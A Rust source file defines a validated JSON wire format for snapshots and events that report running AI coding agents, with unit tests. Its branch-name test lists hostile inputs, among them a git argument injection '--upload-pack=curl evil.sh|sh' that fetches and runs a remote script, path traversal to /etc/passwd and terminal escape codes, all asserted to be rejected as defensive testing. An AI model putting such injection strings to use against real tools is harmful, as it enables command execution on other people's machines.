use std::fmt;

use jiff::Timestamp;
use serde::{Deserialize, Serialize};

pub const SCHEMA_VERSION: u32 = 2;

pub const MAX_AGENTS: usize = 64;

pub const MAX_SNAPSHOT_BYTES: usize = 256 * 1024;

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Snapshot {
    pub schema: u32,
    pub host: HostId,
    pub collected_at: Timestamp,
    pub agents: Vec<Agent>,
}

impl Snapshot {
    pub fn from_json(bytes: &[u8]) -> Result<Self, WireError> {
        if bytes.len() > MAX_SNAPSHOT_BYTES {
            return Err(WireError::TooLarge(bytes.len()));
        }
        let snapshot: Self = serde_json::from_slice(bytes).map_err(|e| WireError::Json {
            line: e.line(),
            column: e.column(),
        })?;
        if snapshot.schema != SCHEMA_VERSION {
            return Err(WireError::Schema(snapshot.schema));
        }
        if snapshot.agents.len() > MAX_AGENTS {
            return Err(WireError::TooManyAgents(snapshot.agents.len()));
        }
        Ok(snapshot)
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Agent {
    pub id: JobId,
    pub repo: RepoSlug,
    pub run_state: RunState,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub branch: Option<BranchName>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ticket: Option<TicketId>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ahead: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub dirty_files: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tasks: Option<TaskProgress>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub pr: Option<u32>,
    /// Which agentic tool this row came from. `None` means the producer
    /// predates the field, which is a different fact from "the producer could
    /// not tell" — collapsing them into one sentinel would hide the second.
    /// It stays `None` on the wire until every reader can parse it, because
    /// `Agent` denies unknown fields and an old peer meeting this drops its
    /// whole connection.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tool: Option<ToolId>,
    pub started_at: Timestamp,
    pub updated_at: Timestamp,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(try_from = "RawTaskProgress")]
pub struct TaskProgress {
    completed: u16,
    total: u16,
}

impl TaskProgress {
    pub fn new(completed: u16, total: u16) -> Result<Self, WireError> {
        if total == 0 || completed > total {
            return Err(WireError::TaskProgress { completed, total });
        }
        Ok(Self { completed, total })
    }

    pub fn completed(&self) -> u16 {
        self.completed
    }

    pub fn total(&self) -> u16 {
        self.total
    }
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct RawTaskProgress {
    completed: u16,
    total: u16,
}

impl TryFrom<RawTaskProgress> for TaskProgress {
    type Error = WireError;

    fn try_from(raw: RawTaskProgress) -> Result<Self, Self::Error> {
        Self::new(raw.completed, raw.total)
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RunState {
    Working,
    Idle,
    NeedsInput,
    Done,
    Unknown,
}

impl fmt::Display for RunState {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let s = match self {
            Self::Working => "working",
            Self::Idle => "idle",
            Self::NeedsInput => "needs input",
            Self::Done => "done",
            Self::Unknown => "unknown",
        };
        f.write_str(s)
    }
}

pub const EVENT_SCHEMA_VERSION: u32 = 1;

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Event {
    pub schema: u32,
    pub at: Timestamp,
    pub engineer: HostId,
    pub repo: RepoSlug,
    pub job: JobId,
    pub kind: EventKind,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ticket: Option<TicketId>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub branch: Option<BranchName>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub pr: Option<u32>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case", deny_unknown_fields)]
pub enum EventKind {
    Started,
    StateChanged { from: RunState, to: RunState },
    Finished,
    PrOpened,
    PrMerged,
}

pub fn event_field_inventory() -> &'static [&'static str] {
    &[
        "schema", "at", "engineer", "repo", "job", "kind", "ticket", "branch", "pr",
    ]
}

#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum WireError {
    #[error("host id must be 1-32 chars of [a-z0-9-], starting alphanumeric")]
    HostId,
    #[error("tool id must be 1-32 chars of [a-z0-9-], starting alphanumeric")]
    ToolId,
    #[error("project id must be 1-32 chars of [a-z0-9-], starting alphanumeric")]
    ProjectId,
    #[error("repo slug must be owner/repo with 1-100 chars of [A-Za-z0-9._-] each")]
    RepoSlug,
    #[error("job id must be 4-64 chars of [a-f0-9-]")]
    JobId,
    #[error("branch name failed git ref validation, or began with '-'")]
    BranchName,
    #[error("ticket id must look like ABC-123")]
    TicketId,
    #[error("task progress reported {completed} completed of {total}")]
    TaskProgress { completed: u16, total: u16 },
    #[error("snapshot is {0} bytes, over the limit")]
    TooLarge(usize),
    #[error("snapshot declares schema {0}, which this build does not read")]
    Schema(u32),
    #[error("snapshot declares {0} agents, over the limit")]
    TooManyAgents(usize),
    #[error("snapshot is not valid json for this schema (line {line}, column {column})")]
    Json { line: usize, column: usize },
}

macro_rules! string_newtype {
    ($(#[$meta:meta])* $name:ident) => {
        $(#[$meta])*
        #[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
        #[serde(try_from = "String", into = "String")]
        pub struct $name(String);

        impl $name {
            pub fn as_str(&self) -> &str {
                &self.0
            }
        }

        impl fmt::Display for $name {
            fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
                f.write_str(&self.0)
            }
        }

        impl AsRef<str> for $name {
            fn as_ref(&self) -> &str {
                &self.0
            }
        }

        impl From<$name> for String {
            fn from(v: $name) -> Self {
                v.0
            }
        }

        impl TryFrom<String> for $name {
            type Error = WireError;
            fn try_from(v: String) -> Result<Self, Self::Error> {
                Self::try_from(v.as_str())
            }
        }
    };
}

string_newtype! {
    HostId
}

impl TryFrom<&str> for HostId {
    type Error = WireError;

    fn try_from(value: &str) -> Result<Self, Self::Error> {
        let ok = (1..=32).contains(&value.len())
            && value.starts_with(|c: char| c.is_ascii_lowercase() || c.is_ascii_digit())
            && value
                .chars()
                .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-');
        if ok {
            Ok(Self(value.to_owned()))
        } else {
            Err(WireError::HostId)
        }
    }
}

string_newtype! {
    /// The agentic tool a row came from: `claude-code`, `codex`, `qwen`.
    ///
    /// Same rule as `HostId`, deliberately — it renders in a terminal beside
    /// one, so it earns the same charset argument, and reusing a rule already
    /// argued is one fewer thing to reason about. `.` is excluded because
    /// permitting it invites a version number, and a version number would
    /// fragment `who` into a row per build.
    ToolId
}

impl ToolId {
    /// Names this crate owns. Built without going through `try_from` because
    /// the field is private to this crate and there is no fallible path to
    /// report — a test asserts each one would pass validation anyway, so a typo
    /// fails here rather than turning into a silently absent tool at runtime.
    pub fn claude_code() -> Self {
        Self("claude-code".to_owned())
    }

    /// What a declared record reports when its writer did not name a tool.
    /// Reserved: a `[[provider]]` block may not take this name, nor `unknown`.
    pub fn declared() -> Self {
        Self("declared".to_owned())
    }
}

impl TryFrom<&str> for ToolId {
    type Error = WireError;

    fn try_from(value: &str) -> Result<Self, Self::Error> {
        let ok = (1..=32).contains(&value.len())
            && value.starts_with(|c: char| c.is_ascii_lowercase() || c.is_ascii_digit())
            && value
                .chars()
                .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-');
        if ok {
            Ok(Self(value.to_owned()))
        } else {
            Err(WireError::ToolId)
        }
    }
}

string_newtype! {
    /// A project in the portCo sense, which spans repos: `example-repo` is both
    /// `example-org/example-repo` and `example-org/example-repo-portal`.
    ///
    /// Same rule as `HostId` and `ToolId`. Uppercase is excluded so `Example-repo`
    /// and `example-repo` cannot be two projects, and the constructor refuses rather
    /// than normalises, so two long ids sharing a prefix cannot be truncated
    /// into one.
    ProjectId
}

impl TryFrom<&str> for ProjectId {
    type Error = WireError;

    fn try_from(value: &str) -> Result<Self, Self::Error> {
        let ok = (1..=32).contains(&value.len())
            && value.starts_with(|c: char| c.is_ascii_lowercase() || c.is_ascii_digit())
            && value
                .chars()
                .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-');
        if ok {
            Ok(Self(value.to_owned()))
        } else {
            Err(WireError::ProjectId)
        }
    }
}

string_newtype! {
    RepoSlug
}

impl RepoSlug {
    pub fn owner(&self) -> &str {
        self.0.split('/').next().unwrap_or_default()
    }

    pub fn repo(&self) -> &str {
        self.0.rsplit('/').next().unwrap_or_default()
    }
}

impl TryFrom<&str> for RepoSlug {
    type Error = WireError;

    fn try_from(value: &str) -> Result<Self, Self::Error> {
        fn segment_ok(s: &str) -> bool {
            (1..=100).contains(&s.len())
                && s != "."
                && s != ".."
                && !s.starts_with('-')
                && s.chars()
                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
        }
        let mut parts = value.split('/');
        match (parts.next(), parts.next(), parts.next()) {
            (Some(owner), Some(repo), None) if segment_ok(owner) && segment_ok(repo) => {
                Ok(Self(value.to_owned()))
            }
            _ => Err(WireError::RepoSlug),
        }
    }
}

string_newtype! {
    JobId
}

impl TryFrom<&str> for JobId {
    type Error = WireError;

    fn try_from(value: &str) -> Result<Self, Self::Error> {
        let ok = (4..=64).contains(&value.len())
            && value
                .chars()
                .all(|c| (c.is_ascii_hexdigit() && !c.is_ascii_uppercase()) || c == '-');
        if ok {
            Ok(Self(value.to_owned()))
        } else {
            Err(WireError::JobId)
        }
    }
}

string_newtype! {
    BranchName
}

impl TryFrom<&str> for BranchName {
    type Error = WireError;

    fn try_from(value: &str) -> Result<Self, Self::Error> {
        let forbidden_char = |c: char| {
            c.is_ascii_control()
                || c == '\u{7f}'
                || matches!(c, ' ' | '~' | '^' | ':' | '?' | '*' | '[' | '\\')
                || !c.is_ascii()
        };
        let ok = (1..=200).contains(&value.len())
            && !value.starts_with('-')
            && !value.starts_with('/')
            && !value.ends_with('/')
            && !value.ends_with('.')
            && !value.ends_with(".lock")
            && !value.contains("..")
            && !value.contains("//")
            && !value.contains("@{")
            && !value.chars().any(forbidden_char);
        if ok {
            Ok(Self(value.to_owned()))
        } else {
            Err(WireError::BranchName)
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(try_from = "String", into = "String")]
pub struct TicketId {
    prefix: String,
    number: u32,
}

impl TicketId {
    pub fn new(prefix: &str, number: u32) -> Result<Self, WireError> {
        let prefix_ok =
            (2..=10).contains(&prefix.len()) && prefix.chars().all(|c| c.is_ascii_uppercase());
        if !prefix_ok || !(1..=999_999).contains(&number) {
            return Err(WireError::TicketId);
        }
        Ok(Self {
            prefix: prefix.to_owned(),
            number,
        })
    }

    pub fn prefix(&self) -> &str {
        &self.prefix
    }

    pub fn number(&self) -> u32 {
        self.number
    }
}

impl fmt::Display for TicketId {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}-{}", self.prefix, self.number)
    }
}

impl From<TicketId> for String {
    fn from(v: TicketId) -> Self {
        v.to_string()
    }
}

impl TryFrom<String> for TicketId {
    type Error = WireError;
    fn try_from(v: String) -> Result<Self, Self::Error> {
        Self::try_from(v.as_str())
    }
}

impl TryFrom<&str> for TicketId {
    type Error = WireError;

    fn try_from(value: &str) -> Result<Self, Self::Error> {
        let (prefix, number) = value.split_once('-').ok_or(WireError::TicketId)?;
        let number = number.parse::<u32>().map_err(|_| WireError::TicketId)?;
        Self::new(prefix, number)
    }
}

pub fn snapshot_field_inventory() -> (&'static [&'static str], &'static [&'static str]) {
    (
        &["schema", "host", "collected_at", "agents"],
        &[
            "id",
            "repo",
            "run_state",
            "branch",
            "ticket",
            "ahead",
            "dirty_files",
            "tasks",
            "pr",
            "tool",
            "started_at",
            "updated_at",
        ],
    )
}

#[cfg(test)]
mod tests {
    #![allow(
        clippy::unwrap_used,
        clippy::expect_used,
        clippy::panic,
        clippy::indexing_slicing
    )]

    use super::*;

    fn full_snapshot() -> Snapshot {
        Snapshot {
            schema: SCHEMA_VERSION,
            host: HostId::try_from("sandbank").unwrap(),
            collected_at: "2026-08-10T19:56:51.322Z".parse().unwrap(),
            agents: vec![Agent {
                id: JobId::try_from("1e631e34").unwrap(),
                repo: RepoSlug::try_from("example-org/example-repo").unwrap(),
                run_state: RunState::NeedsInput,
                branch: Some(BranchName::try_from("feature/eng-557-qa-rescore-ui").unwrap()),
                ticket: Some(TicketId::new("ENG", 557).unwrap()),
                ahead: Some(3),
                dirty_files: Some(7),
                tasks: Some(TaskProgress::new(9, 13).unwrap()),
                pr: Some(627),
                tool: Some(ToolId::try_from("claude-code").unwrap()),
                started_at: "2026-08-10T17:41:03.591Z".parse().unwrap(),
                updated_at: "2026-08-10T19:53:28.829Z".parse().unwrap(),
            }],
        }
    }

    #[test]
    fn wire_has_no_field_beyond_the_inventory() {
        let (snapshot_keys, agent_keys) = snapshot_field_inventory();
        let value = serde_json::to_value(full_snapshot()).unwrap();

        let mut got: Vec<_> = value.as_object().unwrap().keys().cloned().collect();
        got.sort();
        let mut want: Vec<String> = snapshot_keys.iter().map(|s| (*s).to_owned()).collect();
        want.sort();
        assert_eq!(got, want, "Snapshot gained or lost a field");

        let agent = value
            .get("agents")
            .and_then(|a| a.get(0))
            .and_then(|a| a.as_object())
            .unwrap();
        let mut got: Vec<_> = agent.keys().cloned().collect();
        got.sort();
        let mut want: Vec<String> = agent_keys.iter().map(|s| (*s).to_owned()).collect();
        want.sort();
        assert_eq!(got, want, "Agent gained or lost a field");
    }

    #[test]
    fn the_inventory_fixture_populates_every_optional_field() {
        let snapshot = full_snapshot();
        let Agent {
            id: _,
            repo: _,
            run_state: _,
            branch,
            ticket,
            ahead,
            dirty_files,
            tasks,
            pr,
            tool,
            started_at: _,
            updated_at: _,
        } = snapshot.agents.first().unwrap();

        for (name, present) in [
            ("branch", branch.is_some()),
            ("ticket", ticket.is_some()),
            ("ahead", ahead.is_some()),
            ("dirty_files", dirty_files.is_some()),
            ("tasks", tasks.is_some()),
            ("pr", pr.is_some()),
            ("tool", tool.is_some()),
        ] {
            assert!(
                present,
                "{name} is None, so the inventory lock cannot see it"
            );
        }
    }

    fn full_event() -> Event {
        Event {
            schema: EVENT_SCHEMA_VERSION,
            at: "2026-08-10T19:56:51.322Z".parse().unwrap(),
            engineer: HostId::try_from("sandbank").unwrap(),
            repo: RepoSlug::try_from("example-org/example-repo").unwrap(),
            job: JobId::try_from("1e631e34").unwrap(),
            kind: EventKind::StateChanged {
                from: RunState::Working,
                to: RunState::NeedsInput,
            },
            ticket: Some(TicketId::new("ENG", 557).unwrap()),
            branch: Some(BranchName::try_from("feature/eng-557-qa-rescore-ui").unwrap()),
            pr: Some(627),
        }
    }

    #[test]
    fn an_event_has_no_field_beyond_the_inventory() {
        let value = serde_json::to_value(full_event()).unwrap();
        let mut got: Vec<_> = value.as_object().unwrap().keys().cloned().collect();
        got.sort();
        let mut want: Vec<String> = event_field_inventory()
            .iter()
            .map(|s| (*s).to_owned())
            .collect();
        want.sort();
        assert_eq!(got, want, "Event gained or lost a field");
    }

    #[test]
    fn the_event_fixture_populates_every_optional_field() {
        let Event {
            schema: _,
            at: _,
            engineer: _,
            repo: _,
            job: _,
            kind: _,
            ticket,
            branch,
            pr,
        } = full_event();

        for (name, present) in [
            ("ticket", ticket.is_some()),
            ("branch", branch.is_some()),
            ("pr", pr.is_some()),
        ] {
            assert!(
                present,
                "{name} is None, so the inventory lock cannot see it"
            );
        }
    }

    #[test]
    fn nothing_a_state_json_carries_can_be_assigned_to_an_event() {
        let state_json = serde_json::json!({
            "state": "working",
            "tempo": "blocked",
            "cwd": "/Users/sandbank/clients/acme-litigation",
            "sessionId": "9f3c1a7e-4b2d-4e91-8a55-1c0de2f6b7aa",
            "createdAt": "2026-08-10T17:41:03.591Z",
            "updatedAt": "2026-08-10T19:53:28.829Z",
            "intent": "pasting the thread from #legal: Dart says the Acme settlement \
                       number is 4.2M and we should not put it in writing anywhere",
            "detail": "third party named above, do not share outside the room",
            "name": "Acme settlement figure rework",
            "children": [{"kind": "pr", "href": "https://github.com/example-org/example-repo/pull/627"}],
            "tasks": [{"subject": "redo the Acme numbers before Dart's 4pm"}],
        });

        let prose = [
            state_json["intent"].as_str().unwrap(),
            state_json["detail"].as_str().unwrap(),
            state_json["name"].as_str().unwrap(),
            state_json["tasks"][0]["subject"].as_str().unwrap(),
            state_json["cwd"].as_str().unwrap(),
            state_json["children"][0]["href"].as_str().unwrap(),
        ];

        for text in prose {
            assert!(
                HostId::try_from(text).is_err(),
                "engineer accepted {text:?}"
            );
            assert!(RepoSlug::try_from(text).is_err(), "repo accepted {text:?}");
            assert!(JobId::try_from(text).is_err(), "job accepted {text:?}");
            assert!(
                BranchName::try_from(text).is_err(),
                "branch accepted {text:?}"
            );
            assert!(
                TicketId::try_from(text).is_err(),
                "ticket accepted {text:?}"
            );
            assert!(ToolId::try_from(text).is_err(), "tool accepted {text:?}");
        }

        let json = serde_json::to_string(&full_event()).unwrap();
        for text in prose {
            assert!(!json.contains(text), "an event carried prose: {json}");
        }
        assert!(!json.contains("Acme"), "{json}");
        assert!(!json.contains("/Users/"), "{json}");
    }

    #[test]
    fn an_event_declares_its_own_schema_separately_from_the_snapshots() {
        let value = serde_json::to_value(full_event()).unwrap();
        assert_eq!(value["schema"], serde_json::json!(EVENT_SCHEMA_VERSION));
    }

    #[test]
    fn an_event_round_trips_and_refuses_a_kind_it_does_not_know() {
        let event = full_event();
        let json = serde_json::to_vec(&event).unwrap();
        assert_eq!(serde_json::from_slice::<Event>(&json).unwrap(), event);

        for hostile in [
            r#""quiesced""#,
            r#"{"state_changed":{"from":"working"}}"#,
            r#"{"state_changed":{"from":"working","to":"idle","note":"x"}}"#,
        ] {
            assert!(
                serde_json::from_str::<EventKind>(hostile).is_err(),
                "accepted {hostile}"
            );
        }
    }

    #[test]
    fn task_progress_from_another_machine_cannot_divide_by_zero() {
        for hostile in [
            br#"{"completed":9,"total":0}"#.as_slice(),
            br#"{"completed":0,"total":0}"#.as_slice(),
            br#"{"completed":14,"total":13}"#.as_slice(),
        ] {
            assert!(
                serde_json::from_slice::<TaskProgress>(hostile).is_err(),
                "accepted {}",
                String::from_utf8_lossy(hostile)
            );
        }
        let ok: TaskProgress = serde_json::from_slice(br#"{"completed":9,"total":13}"#).unwrap();
        assert_eq!((ok.completed(), ok.total()), (9, 13));
    }

    #[test]
    fn a_snapshot_carrying_impossible_task_progress_is_refused_whole() {
        let hostile = br#"{
            "schema": 2, "host": "shelter",
            "collected_at": "2026-08-10T19:56:51.322Z",
            "agents": [{
                "id": "1e631e34", "repo": "example-org/example-repo",
                "run_state": "working", "tasks": {"completed": 9, "total": 0},
                "started_at": "2026-08-10T17:41:03.591Z",
                "updated_at": "2026-08-10T19:53:28.829Z"
            }]
        }"#;
        assert!(matches!(
            Snapshot::from_json(hostile),
            Err(WireError::Json { .. })
        ));
    }

    #[test]
    fn a_branch_that_is_really_a_git_flag_is_rejected() {
        for hostile in [
            "--upload-pack=curl evil.sh|sh",
            "-x",
            "feature/../../etc/passwd",
            "feature/\u{1b}]0;pwn\u{7}",
            "feature/with space",
            "refs/heads/x.lock",
            "feature/x@{0}",
        ] {
            assert_eq!(
                BranchName::try_from(hostile),
                Err(WireError::BranchName),
                "accepted {hostile:?}"
            );
        }
        assert!(BranchName::try_from("feature/eng-557-qa-rescore-ui").is_ok());
    }

    #[test]
    fn the_names_this_crate_builds_by_hand_would_pass_validation() {
        // These skip `try_from` because the field is private here. That is only
        // safe while they would have passed it.
        for built in [ToolId::claude_code(), ToolId::declared()] {
            assert_eq!(ToolId::try_from(built.as_str()), Ok(built.clone()));
        }
    }

    #[test]
    fn a_tool_id_cannot_carry_a_sentence_or_a_path() {
        for hostile in [
            "../shelter",
            "a/b",
            "Claude-Code",
            "",
            "-x",
            "claude code",
            "claude.code",
            "gpt_4",
            &"a".repeat(33),
        ] {
            assert_eq!(ToolId::try_from(hostile), Err(WireError::ToolId));
        }
        for ok in [
            "claude-code",
            "codex",
            "qwen",
            "ollama",
            "conductor",
            "declared",
        ] {
            assert!(ToolId::try_from(ok).is_ok(), "rejected {ok:?}");
        }
    }

    #[test]
    fn a_project_id_cannot_carry_a_sentence_or_a_path() {
        for hostile in [
            "",
            &"a".repeat(33),
            "a/b",
            "../example-repo",
            "example-repo portal",
            "example-repo\tportal",
            "example-repo\n",
            "\u{1b}]0;pwn\u{7}",
            "Example-repo",
            "-x",
            "euph.ony",
            "euph_ony",
        ] {
            assert_eq!(
                ProjectId::try_from(hostile),
                Err(WireError::ProjectId),
                "accepted {hostile:?}"
            );
        }
        for ok in [
            "example-repo",
            "example-repo-portal",
            "example-tools",
            &"a".repeat(32),
        ] {
            assert!(ProjectId::try_from(ok).is_ok(), "rejected {ok:?}");
        }
    }

    #[test]
    fn a_project_id_deserialises_only_through_its_constructor() {
        let id: ProjectId = serde_json::from_str(r#""example-repo""#).unwrap();
        assert_eq!(id.as_str(), "example-repo");
        assert_eq!(serde_json::to_string(&id).unwrap(), r#""example-repo""#);
        for hostile in [r#""../x""#, r#""Example-repo""#, r#""""#] {
            assert!(
                serde_json::from_str::<ProjectId>(hostile).is_err(),
                "deserialised {hostile}"
            );
        }
    }

    #[test]
    fn two_long_project_ids_sharing_a_prefix_cannot_become_the_same_project() {
        let victim = format!("{}atlas", "a".repeat(32));
        let impostor = format!("{}magenta", "a".repeat(32));
        let collision = ProjectId::try_from("a".repeat(32).as_str()).unwrap();

        let resolved: Vec<ProjectId> = [&victim, &impostor]
            .into_iter()
            .filter_map(|id| ProjectId::try_from(id.as_str()).ok())
            .collect();
        assert!(
            resolved.is_empty(),
            "an id too long for ProjectId was accepted as {resolved:?}, \
             which could collide on {collision}"
        );
    }

    #[test]
    fn host_id_cannot_escape_its_own_key() {
        for hostile in ["../shelter", "a/b", "Sandbank", "", "-x", &"a".repeat(33)] {
            assert_eq!(HostId::try_from(hostile), Err(WireError::HostId));
        }
        assert!(HostId::try_from("shelter").is_ok());
    }

    #[test]
    fn repo_slug_is_exactly_owner_slash_repo() {
        for hostile in [
            "example-repo",
            "a/b/c",
            "../../etc",
            "example-org/",
            "-evil/repo",
            "example-org/..",
        ] {
            assert_eq!(RepoSlug::try_from(hostile), Err(WireError::RepoSlug));
        }
        let slug = RepoSlug::try_from("example-org/example-repo").unwrap();
        assert_eq!(slug.owner(), "example-org");
        assert_eq!(slug.repo(), "example-repo");
    }

    #[test]
    fn ticket_id_round_trips_through_its_two_halves() {
        let t = TicketId::try_from("ENG-557").unwrap();
        assert_eq!(t.prefix(), "ENG");
        assert_eq!(t.number(), 557);
        assert_eq!(t.to_string(), "ENG-557");
        for hostile in ["eng-557", "ENG-", "ENG-0", "557", "E-1", "ENG-abc"] {
            assert_eq!(TicketId::try_from(hostile), Err(WireError::TicketId));
        }
    }

    #[test]
    fn task_progress_cannot_exceed_its_total() {
        assert!(TaskProgress::new(14, 13).is_err());
        assert!(TaskProgress::new(0, 13).is_ok());
        assert!(TaskProgress::new(0, 0).is_err());
    }

    #[test]
    fn an_unknown_field_fails_the_read_path() {
        let mut value = serde_json::to_value(full_snapshot()).unwrap();
        value.as_object_mut().unwrap().insert(
            "intent".to_owned(),
            serde_json::Value::String("a pasted slack thread".to_owned()),
        );
        let bytes = serde_json::to_vec(&value).unwrap();
        assert!(matches!(
            Snapshot::from_json(&bytes),
            Err(WireError::Json { .. })
        ));
    }

    #[test]
    fn read_path_refuses_an_unknown_schema_and_an_oversized_body() {
        let mut snapshot = full_snapshot();
        snapshot.schema = 99;
        let bytes = serde_json::to_vec(&snapshot).unwrap();
        assert_eq!(Snapshot::from_json(&bytes), Err(WireError::Schema(99)));

        let huge = vec![b'x'; MAX_SNAPSHOT_BYTES + 1];
        assert_eq!(
            Snapshot::from_json(&huge),
            Err(WireError::TooLarge(MAX_SNAPSHOT_BYTES + 1))
        );
    }

    #[test]
    fn read_path_refuses_more_agents_than_a_machine_could_run() {
        let mut snapshot = full_snapshot();
        let agent = snapshot.agents[0].clone();
        snapshot.agents = vec![agent; MAX_AGENTS + 1];
        let bytes = serde_json::to_vec(&snapshot).unwrap();
        assert_eq!(
            Snapshot::from_json(&bytes),
            Err(WireError::TooManyAgents(MAX_AGENTS + 1))
        );
    }

    #[test]
    fn a_snapshot_from_the_publishing_era_is_refused_rather_than_reinterpreted() {
        let old = br#"{
            "schema": 1, "host": "shelter",
            "published_at": "2026-08-10T19:56:51.322Z",
            "publish_interval_secs": 60,
            "agents": []
        }"#;
        assert!(matches!(
            Snapshot::from_json(old),
            Err(WireError::Json { .. })
        ));

        let same_shape = br#"{
            "schema": 1, "host": "shelter",
            "collected_at": "2026-08-10T19:56:51.322Z",
            "agents": []
        }"#;
        assert_eq!(Snapshot::from_json(same_shape), Err(WireError::Schema(1)));
    }

    #[test]
    fn the_old_timestamp_key_is_not_silently_accepted() {
        let old_key = br#"{
            "schema": 2, "host": "shelter",
            "published_at": "2026-08-10T19:56:51.322Z",
            "agents": []
        }"#;
        assert!(matches!(
            Snapshot::from_json(old_key),
            Err(WireError::Json { .. })
        ));
    }

    #[test]
    fn absent_optionals_are_absent_from_the_json_not_null() {
        let mut snapshot = full_snapshot();
        snapshot.agents[0].tasks = None;
        snapshot.agents[0].pr = None;
        let json = serde_json::to_string(&snapshot).unwrap();
        assert!(!json.contains("tasks"), "{json}");
        assert!(!json.contains("\"pr\""), "{json}");
        let bytes = json.into_bytes();
        assert_eq!(Snapshot::from_json(&bytes).unwrap(), snapshot);
    }
}
